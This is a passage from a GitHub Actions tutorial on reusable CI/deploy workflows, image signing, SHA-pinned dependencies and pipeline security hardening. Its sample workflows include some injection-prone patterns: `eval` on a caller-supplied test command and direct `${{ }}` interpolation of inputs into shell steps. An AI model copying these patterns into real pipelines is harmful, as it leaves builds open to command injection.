  workflow_call:
    inputs:
      service:     {type: string, required: true,  description: 'The directory under apps/'}
      language:    {type: string, required: true,  description: 'java|go|python|node'}
      context:     {type: string, default: '.',    description: 'The Docker build context'}
      dockerfile:  {type: string, default: '',     description: 'Defaults to <context>/Dockerfile'}
      registry:    {type: string, default: 'ghcr.io/3558bhk'}
      push:        {type: boolean, default: false, description: '⭐ false on PRs'}
      scan:        {type: boolean, default: true}
      sign:        {type: boolean, default: true}
      platforms:   {type: string, default: 'linux/amd64'}
      timeout:     {type: number, default: 30}
      max-critical:{type: number, default: 0}
      cache-scope: {type: string, default: ''}
      test-command:{type: string, default: '',     description: 'Overrides ci/test-<lang>.sh'}
    secrets:
      registry-token: {required: false, description: 'Falls back to GITHUB_TOKEN'}
      slack-webhook:  {required: false}
    outputs:
      digest:   {description: 'The image digest', value: '${{ jobs.build.outputs.digest }}'}
      image:    {description: 'The full image ref', value: '${{ jobs.build.outputs.image }}'}
      version:  {description: 'The semantic version', value: '${{ jobs.build.outputs.version }}'}
      sbom-sha: {description: 'The SBOM artifact name', value: '${{ jobs.build.outputs.sbom }}'}

permissions:
  contents: read

jobs:
  build:
    name: 🏗️ ${{ inputs.service }}
    runs-on: ubuntu-latest
    timeout-minutes: ${{ inputs.timeout }}
    permissions:                          # ⭐⭐ declared HERE, on the callee
      contents: read
      packages: ${{ inputs.push && 'write' || 'read' }}     # ⭐ conditional!
      id-token: ${{ inputs.sign && 'write' || 'read' }}
      security-events: ${{ inputs.scan && 'write' || 'read' }}
    outputs:
      digest:  ${{ steps.build.outputs.digest }}
      image:   ${{ steps.meta.outputs.image }}
      version: ${{ steps.meta.outputs.version }}
      sbom:    sbom-${{ inputs.service }}
    steps:
      - uses: actions/checkout@1125036b2a9a4fd1baa15cf1a94c1e7d0e2bda9b   # v7.0.0 ⭐ SHA
        with: {fetch-depth: 0}

      - uses: ./.github/actions/setup-shop           # ⭐ the library's own composite
        with: {language: '${{ inputs.language }}', service: '${{ inputs.service }}'}

      - uses: ./verify-image/../.github/actions/notify-slack   # (illustrative path)
        if: false

      - name: Compute the version
        id: meta
        run: |
          set -euo pipefail
          SERVICE="${SERVICE_INPUT}"; REGISTRY="${REGISTRY_INPUT}"
          VERSION=$(git describe --tags --always --match 'v*' 2>/dev/null || echo 0.0.0)
          [[ "$VERSION" == v* ]] && VERSION="${VERSION#v}"
          case "$GITHUB_REF" in
            refs/tags/*)   VERSION="${GITHUB_REF_NAME#v}" ;;
            refs/pull/*)   VERSION="pr-${GITHUB_RUN_NUMBER}-${GITHUB_SHA:0:7}" ;;
            *)             VERSION="${VERSION}-sha.${GITHUB_SHA:0:7}" ;;
          esac
          IMAGE="$REGISTRY/$SERVICE"
          {
            echo "version=$VERSION"
            echo "image=$IMAGE"
            echo "full=$IMAGE:$VERSION"
            echo "date=$(date -u +%FT%TZ)"
          } >> "$GITHUB_OUTPUT"
          echo "  $IMAGE:$VERSION"
        env:
          SERVICE_INPUT:  ${{ inputs.service }}
          REGISTRY_INPUT: ${{ inputs.registry }}

      - name: Test
        run: |
          set -euo pipefail
          if [[ -n "${TEST_COMMAND_INPUT}" ]]; then
            eval "$TEST_COMMAND_INPUT"
          else
            ./ci/test-"${LANGUAGE_INPUT}".sh "$SERVICE_INPUT"
          fi
        env:
          TEST_COMMAND_INPUT: ${{ inputs.test-command }}
          LANGUAGE_INPUT:     ${{ inputs.language }}
          SERVICE_INPUT:      ${{ inputs.service }}

      - uses: docker/setup-buildx-action@v3
      - uses: docker/login-action@v3
        if: inputs.push
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.registry-token || secrets.GITHUB_TOKEN }}
      - uses: docker/metadata-action@v5
        id: tags
        with:
          images: ${{ steps.meta.outputs.image }}
          tags: |
            type=raw,value=${{ steps.meta.outputs.version }}
            type=sha,prefix=sha-,format=long
            type=ref,event=tag
            type=raw,value=latest,enable=${{ github.ref == 'refs/heads/main' }}

      - uses: docker/build-push-action@v6
        id: build
        with:
          context: ${{ inputs.context }}
          file: ${{ inputs.dockerfile || format('{0}/Dockerfile', inputs.context) }}
          platforms: ${{ inputs.platforms }}
          push: ${{ inputs.push }}
          load: ${{ !inputs.push }}
          tags: ${{ steps.tags.outputs.tags }}
          labels: ${{ steps.tags.outputs.labels }}
          cache-from: type=gha,scope=${{ inputs.cache-scope || inputs.service }}
          cache-to:   type=gha,mode=max,scope=${{ inputs.cache-scope || inputs.service }}
          provenance: mode=max
          sbom: ${{ inputs.scan }}
          build-args: |
            VERSION=${{ steps.meta.outputs.version }}
            BUILD_SHA=${{ github.sha }}

      - name: ⭐ Gate on vulnerabilities
        if: inputs.scan
        run: |
          set -euo pipefail
          IMG="${{ steps.meta.outputs.full }}"
          mkdir -p reports
          trivy image --format cyclonedx --output "reports/sbom-${{ inputs.service }}.cdx.json" "$IMG"
          R=$(trivy image --quiet --format json --ignore-unfixed "$IMG")
          C=$(echo "$R" | jq '[.Results[].Vulnerabilities[]? | select(.Severity=="CRITICAL")] | length')
          H=$(echo "$R" | jq '[.Results[].Vulnerabilities[]? | select(.Severity=="HIGH")] | length')
          echo "$R" | jq -r '.Results[]?.Vulnerabilities[]? | "  \(.Severity) \(.VulnerabilityID) \(.PkgName) \(.InstalledVersion) → \(.FixedVersion // "no fix")"' | head -40
          echo "  critical=$C high=$H (max critical=${{ inputs.max-critical }})"
          if (( C > ${{ inputs.max-critical }} )); then
            echo "::error::$C CRITICAL vulnerabilities — the library's policy allows ${{ inputs.max-critical }}"
            exit 1
          fi

      - name: ⭐ Sign (keyless)
        if: inputs.sign && inputs.push
        run: |
          set -euo pipefail
          cosign sign --yes \
            --certificate-oidc-issuer=https://token.actions.githubusercontent.com \
            --certificate-identity-regexp="^https://github.com/${GITHUB_REPOSITORY}/\.github/workflows/.*" \
            "${{ steps.meta.outputs.full }}@${{ steps.build.outputs.digest }}"
          cosign attest --yes --type cyclonedx \
            --predicate "reports/sbom-${{ inputs.service }}.cdx.json" \
            "${{ steps.meta.outputs.full }}@${{ steps.build.outputs.digest }}"

      - name: ⭐ Write the machine-readable output
        run: |
          set -euo pipefail
          mkdir -p image-info
          jq -n --arg svc "${{ inputs.service }}" --arg img "${{ steps.meta.outputs.full }}" \
                --arg d "${{ steps.build.outputs.digest }}" --arg sha "$GITHUB_SHA" \
                --arg repo "$GITHUB_REPOSITORY" --arg run "$GITHUB_RUN_ID" \
                --arg lib "${{ github.workflow_ref }}" \
            '{service:$svc, image:$img, digest:$d, revision:$sha, repository:$repo,
              runId:$run, builtBy:$lib, builtAt:(now|todate)}' \
            > "image-info/${{ inputs.service }}.json"
          # ⭐⭐ builtBy records WHICH LIBRARY VERSION built this image — the audit trail
          cat "image-info/${{ inputs.service }}.json"

      - uses: actions/upload-artifact@v4
        if: always()
        with:
          name: image-info-${{ inputs.service }}
          path: image-info/
          if-no-files-found: error
          retention-days: 90
      - uses: actions/upload-artifact@v4
        if: always() && inputs.scan
        with: {name: 'sbom-${{ inputs.service }}', path: 'reports/', retention-days: 90}
```

```yaml
# .github/workflows/reusable-deploy.yml
name: '[reusable] Deploy'
on:
  workflow_call:
    inputs:
      environment:  {type: string, required: true}
      revision:     {type: string, required: true}
      run-id:       {type: number, required: true, description: 'The CI run to download artifacts from'}
      dry-run:      {type: boolean, default: false}
      strategy:     {type: string, default: 'rolling', description: 'rolling|bluegreen|canary'}
      canary-steps: {type: string, default: '10,25,50,100'}
      soak-seconds: {type: number, default: 300}
      require-signed: {type: boolean, default: true}
    secrets:
      slack-webhook: {required: false}
permissions:
  contents: read
  deployments: write
  id-token: write

jobs:
  deploy:
    name: 🚀 ${{ inputs.environment }}
    runs-on: ubuntu-latest
    timeout-minutes: 45
    environment:
      name: ${{ inputs.environment }}
    concurrency:
      group: deploy-${{ inputs.environment }}
      cancel-in-progress: false                 # ⭐⭐ the mutex
    steps:
      - uses: actions/checkout@v7

      - name: ⭐ Download the artifact from the CI run — never rebuild
        uses: actions/download-artifact@v4
        with:
          github-token: ${{ secrets.GITHUB_TOKEN }}
          run-id: ${{ inputs.run-id }}
          pattern: image-info-*
          path: image-info
          merge-multiple: true

      - name: ⭐ Prove the revision passed CI
        run: |
          set -euo pipefail
          CONCLUSION=$(gh api "repos/$GITHUB_REPOSITORY/actions/runs/${{ inputs.run-id }}" \
            --jq .conclusion)
          HEAD=$(gh api "repos/$GITHUB_REPOSITORY/actions/runs/${{ inputs.run-id }}" --jq .head_sha)
          echo "  run ${{ inputs.run-id }}: conclusion=$CONCLUSION head=${HEAD:0:7}"
          [[ "$CONCLUSION" == "success" ]] || { echo "::error::the CI run did not succeed"; exit 1; }
          [[ "$HEAD" == "${{ inputs.revision }}" ]] || {
            echo "::error::the CI run's head ($HEAD) is not the revision we're deploying (${{ inputs.revision }})"; exit 1; }
        env: {GH_TOKEN: '${{ secrets.GITHUB_TOKEN }}'}

      - name: ⭐ Verify the signature (fail closed)
        if: inputs.require-signed
        uses: ./.github/actions/verify-image
        with:
          info-dir: image-info
          owner: ${{ github.repository_owner }}

      - name: Authenticate
        uses: aws-actions/configure-aws-credentials@v5
        with:
          role-to-assume: ${{ vars.AWS_ROLE_ARN }}
          aws-region: ${{ vars.AWS_REGION }}
          role-session-name: deploy-${{ inputs.environment }}-${{ github.run_id }}

      - name: Deploy
        env:
          DRY_RUN: ${{ inputs.dry-run }}
          STRATEGY: ${{ inputs.strategy }}
          CANARY_STEPS: ${{ inputs.canary-steps }}
          SOAK_SECONDS: ${{ inputs.soak-seconds }}
        run: ./scripts/deploy.sh "${{ inputs.environment }}" "${{ inputs.revision }}"

      - name: Notify
        if: always()
        uses: ./.github/actions/notify-slack
        with:
          webhook: ${{ secrets.slack-webhook }}
          status: ${{ job.status }}
          environment: ${{ inputs.environment }}
          revision: ${{ inputs.revision }}
```

**Step 3 — the composite actions**

```yaml
# .github/actions/verify-image/action.yml
name: 'Verify an image signature and SBOM'
description: >
  Reads image-info/*.json, verifies the cosign signature against this
  repository's OIDC issuer and identity, and gates on CRITICAL vulnerabilities.
  Fails closed: an unsigned image is rejected.
inputs:
  info-dir:  {description: 'The directory of image-info JSON files', required: false, default: 'image-info'}
  owner:     {description: 'The repository owner for gh attestation verify', required: true}
  issuer:    {description: 'The expected OIDC issuer', required: false,
              default: 'https://token.actions.githubusercontent.com'}
  identity-regex:
    description: 'A regexp the certificate identity must match'
    required: false
    default: ''
  max-critical: {description: 'Maximum tolerated CRITICAL CVEs', required: false, default: '0'}
outputs:
  verified: {description: 'How many images were verified', value: '${{ steps.verify.outputs.verified }}'}
runs:
  using: composite
  steps:
    - name: Verify
      id: verify
      shell: bash
      env:
        INFO_DIR: ${{ inputs.info-dir }}
        OWNER: ${{ inputs.owner }}
        ISSUER: ${{ inputs.issuer }}
        IDENTITY: ${{ inputs.identity-regex }}
        MAX_CRIT: ${{ inputs.max-critical }}
      run: |
        set -euo pipefail
        IDENTITY="${IDENTITY:-^https://github.com/${GITHUB_REPOSITORY}/\.github/workflows/.*}"
        verified=0; failed=0
        for f in "$INFO_DIR"/*.json; do
          svc=$(jq -r .service "$f"); img=$(jq -r .image "$f"); dig=$(jq -r .digest "$f")
          echo "==> $svc  $img@$dig"
          if cosign verify "$img@$dig" \
               --certificate-oidc-issuer="$ISSUER" \
               --certificate-identity-regexp="$IDENTITY" >/dev/null 2>&1; then
            echo "  ✅ cosign signature verified"
          else
            echo "  ⛔ cosign verification FAILED"; failed=$((failed+1)); continue
          fi
          if gh attestation verify "oci://$img@$dig" --owner "$OWNER" >/dev/null 2>&1; then
            echo "  ✅ GitHub attestation verified"
          else
            echo "  ⚠️  no GitHub attestation (cosign passed — continuing)"
          fi
          cosign verify-attestation --type cyclonedx "$img@$dig" \
            --certificate-oidc-issuer="$ISSUER" --certificate-identity-regexp="$IDENTITY" \
            >/dev/null 2>&1 && echo "  ✅ the SBOM attestation verified" \
                            || echo "  ⚠️  no SBOM attestation"
          n=$(trivy image --severity CRITICAL --quiet --format json --ignore-unfixed "$img@$dig" \
               | jq '[.Results[].Vulnerabilities[]?] | length')
          echo "  CRITICAL CVEs: $n (max $MAX_CRIT)"
          (( n <= MAX_CRIT )) || { echo "  ⛔ too many"; failed=$((failed+1)); }
          verified=$((verified+1))
        done
        echo "verified=$verified" >> "$GITHUB_OUTPUT"
        if (( failed > 0 )); then
          echo "::error::$failed image(s) failed verification — refusing to deploy"
          exit 1
        fi
        echo "  ✅ $verified image(s) verified"
```

**Step 4 — versioning, CODEOWNERS and Dependabot ⭐⭐**

```bash
# .github/CODEOWNERS in the LIBRARY repo
cat > .github/CODEOWNERS <<'EOF'
*                                  @3558Bhk/platform-team
/.github/workflows/reusable-*.yml  @3558Bhk/platform-team @3558Bhk/security
/.github/actions/verify-image/**   @3558Bhk/security
/docs/API.md                       @3558Bhk/platform-team
EOF

# ⭐⭐ SEMANTIC VERSIONING WITH MOVABLE MAJOR TAGS
# The pattern consumers rely on:
#   @v2        → a MOVABLE tag, always the latest v2.x.x  (gets security patches)
#   @v2.3.1    → an IMMUTABLE tag                          (fully pinned)
#   @<40-char SHA> → ⭐ the strongest
git tag -a v2.3.1 -m "v2.3.1: add the canary strategy input"
git push origin v2.3.1
git tag -fa v2 -m "v2 → v2.3.1"      # ⭐ move the major tag
git push -f origin v2

# ⭐⭐ and the rule: a BREAKING change gets a NEW MAJOR, never a force-pushed tag.
# v3.0.0 removes an input → consumers on @v2 keep working.
```

```yaml
# ⭐ the CONSUMER repo — apps/shop-api/.github/workflows/ci.yml
name: CI
on:
  push: {branches: [main], paths: ['apps/shop-api/**']}
  pull_request: {paths: ['apps/shop-api/**']}

permissions: {contents: read}

jobs:
  ci:
    # ⭐⭐ THREE WAYS TO PIN, from weakest to strongest
    # uses: 3558Bhk/pipeline-templates/.github/workflows/reusable-ci.yml@v2
    # uses: 3558Bhk/pipeline-templates/.github/workflows/reusable-ci.yml@v2.3.1
    uses: 3558Bhk/pipeline-templates/.github/workflows/reusable-ci.yml@a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2  # v2.3.1
    with:
      service: shop-api
      language: java
      context: apps/shop-api
      push: ${{ github.event_name != 'pull_request' }}     # ⭐⭐ never push on a PR
      sign: ${{ github.event_name != 'pull_request' }}
      max-critical: 0
      timeout: 30
    secrets:
      registry-token: ${{ secrets.GHCR_TOKEN }}
    permissions:                                            # ⭐⭐ the CALLER must grant
      contents: read
      packages: write
      id-token: write
      security-events: write

  deploy-staging:
    needs: ci
    if: github.ref == 'refs/heads/main'
    uses: 3558Bhk/pipeline-templates/.github/workflows/reusable-deploy.yml@a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2
    with:
      environment: staging
      revision: ${{ github.sha }}
      run-id: ${{ github.run_id }}
      strategy: rolling
    secrets: {slack-webhook: '${{ secrets.SLACK_WEBHOOK }}'}
```

```yaml
# ⭐⭐ Dependabot in the CONSUMER repo, maintaining the library pins
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: github-actions
    directory: /
    schedule: {interval: weekly, day: monday, time: '04:00', timezone: Asia/Kolkata}
    groups:
      pipeline-templates:
        patterns: ['3558Bhk/pipeline-templates*']     # ⭐ one PR for all library bumps
      actions-minor:
        update-types: [minor, patch]
    ignore:
      - dependency-name: '3558Bhk/pipeline-templates*'
        update-types: [version-update:semver-major]   # ⭐⭐ majors need a human
    labels: [dependencies, ci, pipeline-templates]
    reviewers: ['3558Bhk/platform-team']
    commit-message: {prefix: 'ci(templates)'}
```

```bash
# ⭐ what the Dependabot PR looks like when the library is SHA-pinned:
gh pr diff $N
# -    uses: 3558Bhk/pipeline-templates/…@a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2  # v2.3.1
# +    uses: 3558Bhk/pipeline-templates/…@f9e8d7c6b5a4f9e8d7c6b5a4f9e8d7c6b5a4f9e8  # v2.4.0
# ⭐⭐ Dependabot DOES update SHA pins, and preserves/updates the version comment.
#    That's the whole reason to use SHA pins: you get immutability AND automation.

# ⭐ the rollout: canary the library itself
# 1. bump ONE service (payment-mock) to the new SHA
# 2. watch three builds
# 3. bump the rest
# and if the library has a bug:
git -C pipeline-templates revert <sha> && git tag -fa v2 -m "revert to v2.3.1" && git push -f origin v2
# ⭐ consumers on @v2 get the fix on their next run; consumers on a SHA need a PR.
#    ⭐⭐ THAT TRADE-OFF IS THE REASON SHA-PINNING IS CORRECT FOR SECURITY-CRITICAL
#       LIBRARIES and @v2 is acceptable for internal ones you control.
```

**Step 5 — the docs the library must ship**

```markdown
<!-- docs/API.md — ⭐ the contract test asserts every input/output appears here -->
# pipeline-templates

Reusable GitHub Actions workflows for the shop platform.

## Versioning
- `@v2` — the latest v2.x.x. Security patches land here automatically.
- `@v2.3.1` — an immutable release tag.
- `@<sha>` — ⭐ **required** for anything security-critical. Dependabot maintains it.
- A **breaking** change always gets a new major. We never force-push a major tag
  to introduce a breaking change.

## `reusable-ci.yml`
| Input | Type | Required | Default | Description |
|---|---|---|---|---|
| `service` | string | ✅ | — | The directory under `apps/` |
| `language` | string | ✅ | — | `java` \| `go` \| `python` \| `node` |
| `context` | string | | `.` | The Docker build context |
| `dockerfile` | string | | `<context>/Dockerfile` | |
| `registry` | string | | `ghcr.io/3558bhk` | |
| `push` | boolean | | `false` | ⭐ Set to `false` on PRs |
| `scan` | boolean | | `true` | Trivy + an SBOM |
| `sign` | boolean | | `true` | cosign, keyless |
| `platforms` | string | | `linux/amd64` | |
| `timeout` | number | | `30` | |
| `max-critical` | number | | `0` | The CVE gate |
| `cache-scope` | string | | `<service>` | |
| `test-command` | string | | `./ci/test-<lang>.sh <service>` | |

| Secret | Required | Description |
|---|---|---|
| `registry-token` | | Falls back to `GITHUB_TOKEN` |
| `slack-webhook` | | |

| Output | Description |
|---|---|
| `digest` | The image digest |
| `image` | The full image reference |
| `version` | The semantic version |
| `sbom-sha` | The SBOM artifact name |

### ⭐ The permissions the CALLER must grant
```yaml
permissions:
  contents: read
  packages: write          # if push: true
  id-token: write          # if sign: true
  security-events: write   # if scan: true
```
Reusable workflows do NOT inherit permissions. Omit these and you will get
`Resource not accessible by integration`.

### Migration notes
- **v1 → v2**: `max-vulnerabilities` was split into `max-critical` and (removed) `max-high`.
  The HIGH gate moved to `reusable-scan.yml`.
- **v2.3 → v2.4**: added `strategy` to `reusable-deploy.yml`. Backwards compatible.
```

> 🔑 **The answer to say out loud:** *"Three things make a reusable library trustworthy rather than merely DRY. First, **the library's own CI is stricter than what it ships** — actionlint, zizmor in pedantic persona, and a contract test that parses every `action.yml` and `reusable-*.yml` and asserts every input and output is documented in `docs/API.md` with a consistent type. Second, **SHA pinning plus Dependabot**, which gives you immutability and automation at the same time — Dependabot updates a full-SHA pin and preserves the version comment, so you get the security of a pin without the manual toil of bumping it. Third, **semver discipline with movable major tags**: `@v2` gets security patches automatically for internal libraries, but a breaking change always gets a new major and we never force-push a major tag to introduce one. The subtle part everyone misses is that reusable workflows do **not** inherit `permissions:` — the caller must grant `packages: write`, `id-token: write` and `security-events: write` explicitly, or the callee silently runs read-only and fails with 'Resource not accessible by integration'. I document that in the API file and the contract test checks it."*

---

## ✅ Completion checklist

```
SETUP
  □ a repo, `gh` authenticated with the right scopes, the kind cluster up
  □ the runner probe workflow run at least once — you know what's pre-installed
  □ Organization/repo Actions settings reviewed and tightened

WORKFLOWS
  □ triggers: push (with paths), pull_request (with types), workflow_dispatch
    (with typed inputs), workflow_call, schedule (in UTC), workflow_run
  □ the expression syntax mastered; you've hit the `'false' is truthy` trap
  □ contexts understood: github, env, vars, secrets, inputs, matrix, needs, steps, strategy
  □ job outputs and step outputs working (`>> "$GITHUB_OUTPUT"`)
  □ `$GITHUB_ENV`, `$GITHUB_PATH`, `$GITHUB_STEP_SUMMARY` used
  □ `::notice::` / `::warning file=…,line=…::` / `::error::` annotations
  □ `::group::` for readable logs
  □ a dynamic matrix via `fromJSON(needs.x.outputs.y)`
  □ `fail-fast: false` on every test matrix
  □ `timeout-minutes` on every job
  □ `concurrency` with cancellation on PRs, without it on deploys
  □ `services:` containers with healthchecks
  □ path filters proven to skip a docs-only change

REUSE
  □ a composite action in `.github/actions/` with typed inputs and outputs
  □ a reusable workflow with `on: workflow_call`, typed inputs, secrets and outputs
  □ ⭐ you've hit "Resource not accessible by integration" from a missing caller permission
  □ third-party actions pinned to a FULL COMMIT SHA with the version in a comment
  □ Dependabot maintaining the github-actions ecosystem

RUNNERS
  □ a self-hosted runner registered with labels, run as a service
  □ ⭐ an EPHEMERAL runner understood; you would never run a persistent one on a public repo
  □ ARC deployed with min 0 / max N and scale-to-zero
  □ a larger runner tried, and the build-time difference measured

SECRETS AND OIDC ⭐⭐⭐
  □ repo, environment and org secrets; environment secrets unreachable from a PR job
  □ `vars` for non-secret config
  □ `permissions: id-token: write` set
  □ OIDC to AWS with `sub` scoped to `repo:OWNER/REPO:environment:production`
  □ OIDC to Azure with a federated credential subject scoped the same way
  □ you decoded the token and read your own `sub`
  □ ⭐ you PROVED a PR build cannot assume the production role (a test that must fail)
  □ no long-lived cloud credential anywhere in the repo or its secrets
  □ secrets passed to reusable workflows explicitly, never `inherit`
  □ a secret rotated and verified

CACHING
  □ per-language `cache:` in the setup actions
  □ `actions/cache@v4` with a `hashFiles()` key and a `restore-keys:` prefix
  □ `type=gha` Docker layer cache with a per-service `scope=`
  □ ⭐ cold-vs-warm build times MEASURED and recorded
  □ cache correctness proven (non-empty hash, dependency-tree diff, key changes on edit)
  □ a nightly guaranteed-cold build
  □ cache usage inspected via the API; caches cleared when poisoned

SUPPLY CHAIN
  □ GHCR with the package linked to the repo with Write
  □ `provenance: mode=max` and `sbom: true`
  □ cosign keyless signing with `--certificate-identity-regexp` pinned to the workflow
  □ `actions/attest-build-provenance` so the attestation appears in the GitHub UI
  □ ⭐ the deploy workflow VERIFIES the signature and fails closed
  □ deploy by digest; the CD workflow proves the revision passed CI

SECURITY ⭐⭐
  □ branch protection: approvals, Code Owners, signed commits, no bypass
  □ CODEOWNERS covering workflows, actions, helm, k8s, secrets, payments — and VALIDATED
  □ secret scanning + PUSH PROTECTION
  □ Dependabot for docker, maven, gomod, npm, pip, terraform AND github-actions
  □ CodeQL for every language; Trivy and Semgrep SARIF uploaded to code scanning
  □ ⭐ actionlint AND zizmor scanning the pipelines themselves
  □ the org default workflow permission is `read`; `can_approve_pull_requests` is false
  □ an action allowlist (`allowed_actions: selected`)
  □ fork PR workflows require approval from outside collaborators
  □ ⭐ you reproduced the pwn-request attack in a sandbox and can name its four ingredients
  □ you ran the org-wide audit query looking for `pull_request_target` + head checkout

DEPLOYMENT
  □ environments dev/staging/production with required reviewers
  □ deployment branch policies excluding `refs/pull/**`
  □ a wait timer on production
  □ the Deployments API populated so Environments shows history
  □ `actions/download-artifact` with `run-id` promoting the CI artifact (never a rebuild)
  □ a post-deploy smoke test that fails the job
  □ a rollback rehearsed and timed
  □ Slack notified on success and failure, with the run URL
  □ the GitOps hand-off: CI writes a digest to a config repo PR; Argo CD reconciles

TROUBLESHOOTING
  □ you've fixed: a workflow that didn't trigger, "Resource not accessible by integration",
    a GHCR "denied", a cache miss, an empty `needs` output, a hung step, a disk-full build
  □ `gh run view --log-failed` is muscle memory
  □ you know how to enable ACTIONS_STEP_DEBUG for one run
  □ you've measured per-step durations and made the pipeline faster
  □ you know your monthly Actions minutes and your top-3 workflows by cost

TASKS
  □ 2.1 the monorepo pipeline — measured, with the silent-skip defenses in place
  □ 2.2 OIDC to AWS with the narrowest `sub` — six proofs, three of which must FAIL
  □ 2.3 the pwn-request attack reproduced and defeated — with six org-level defenses
  □ 2.4 CI from 24 min to under 6 — five levers, and the cache correctness proven
  □ 2.5 the reusable library — SHA-pinned, Dependabot-maintained, contract-tested
```

---

## What GitHub Actions gave me, and what it cost me

**Gave me:**
```
⭐ OIDC federation that actually works — `permissions: id-token: write` and three
   lines. The `sub` claim is expressive enough to scope a credential to a single
   environment in a single repository. Nothing else comes close for zero-secret CI.
⭐ The ecosystem. If a tool exists, there's an action for it, with docs and issues.
   The marketplace is 20× the size of Azure DevOps'.
⭐ `on: workflow_dispatch` with TYPED inputs — a choice dropdown, a boolean, a
   `type: environment` that renders your actual environments as a picker.
   Triggering a deploy from your phone is a 10-second thing.
⭐ $GITHUB_STEP_SUMMARY — Markdown rendered on the run page. Coverage tables,
   test diffs, deployment diffs, right where the reviewer looks.
⭐ Reusable workflows + composite actions + `fromJSON` matrices = genuine
   composability. The dynamic matrix is the killer feature for a monorepo.
⭐ `type=gha` Docker cache. No registry permission, no cleanup cron, scoped by key.
   The best Docker caching experience of the three tools.
⭐ Native supply chain: provenance, SBOM, cosign keyless, and `gh attestation verify`
   from a consumer's laptop. The attestation shows up in the package UI.
⭐ Dependabot for seven ecosystems INCLUDING github-actions itself — it bumps your
   SHA pins and preserves the version comment.
⭐ zizmor and actionlint: the pipeline is code, so the pipeline gets linted.
⭐ The free tier on public repos is genuinely unlimited. Learning costs nothing.
```

**Cost me:**
```
⛔ No stages. A multi-environment promotion is `needs:` plus `environment:`,
   which works but has no visual pipeline-of-stages and no per-stage gates object.
⛔ ⭐⭐ Permissions are the single biggest source of "why is this 403?". Not
   inherited by reusable workflows, read-only for fork PRs, overridden per job,
   and silently defaulted by an org setting you can't see from the YAML.
⛔ ⭐⭐ The two GitHub-specific attacks (pwn request, artifact poisoning) are
   subtle enough that experienced engineers ship them. You have to know to look.
⛔ Ephemeral everything. No state between jobs, no persistent Docker layer cache
   on hosted runners (except via `type=gha`), no workspace reuse. Simple and safe,
   but you pay for it in repeated setup.
⛔ 2 vCPU / 7 GB / 14 GB on the free runner. A Spring Boot integration test with
   Testcontainers and a JVM will OOM, and a big Docker build will fill the disk.
   Larger runners cost real money per minute.
⛔ Per-minute billing is unpredictable. A runaway matrix can cost $400 in an hour
   with no warning. Set spending limits AND org-level minute caps.
⛔ `paths` and `paths-ignore` can't be combined on one event — silently, the
   second is ignored.
⛔ GHCR package ↔ repository linking is a manual UI step that fails with an
   inscrutable "denied" until you find it.
⛔ The YAML gets deeply nested for anything non-trivial, and `${{ }}` interpolation
   into a `run:` script is a permanent injection footgun that linters only partly catch.
⛔ Schedule triggers are UTC, may be delayed up to an hour, and silently stop on
   a repo inactive for 60 days.
```

**When I'd choose it again:** the code is on GitHub (which, for most teams, it is). You want OIDC to any cloud with zero stored secrets, the largest ecosystem of prebuilt actions, and a pipeline you can trigger from your phone with typed inputs.

**When I wouldn't:** you need rich governance objects — deployment windows, change-ticket integration, per-resource approval history, manual test plans — where Azure DevOps is genuinely ahead. Or you need a huge, custom, on-prem build farm with exotic toolchains, where Jenkins' flexibility still wins.

---

## Where next

| You want | Go to |
|---|---|
| 🔨 The same app through Jenkins | [04-CASE-3-jenkins.md](./04-CASE-3-jenkins.md) |
| 🔷 The same app through Azure DevOps | [02-CASE-1-azure-devops.md](./02-CASE-1-azure-devops.md) |
| 🏆 All three + GitOps + progressive delivery + 5 capstone tasks | [05-CAPSTONE-END-TO-END.md](./05-CAPSTONE-END-TO-END.md) |
| ⚡ Everything on one page | [06-CHEATSHEET.md](./06-CHEATSHEET.md) |
| 📖 The theory (the pwn request attack in full, the secrets ladder) | [01-CICD-GUIDE.md](./01-CICD-GUIDE.md) §12 |
| ⏱️ The hour-by-hour plan | [00-ONE-DAY-MASTER-PLAN.md](./00-ONE-DAY-MASTER-PLAN.md) |

---

<div align="center">

**Created by Harish Kumar Brahmandam**

[![LinkedIn](https://img.shields.io/badge/LinkedIn-Harish_Kumar_Brahmandam-0A66C2?style=for-the-badge&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/harish-kumar-brahmandam-b38a88260)
[![GitHub](https://img.shields.io/badge/GitHub-3558Bhk-181717?style=for-the-badge&logo=github&logoColor=white)](https://github.com/3558Bhk)

🔗 LinkedIn: https://www.linkedin.com/in/harish-kumar-brahmandam-b38a88260
🔗 GitHub: https://github.com/3558Bhk

*Built for engineers who learn by breaking things on purpose.*

</div>
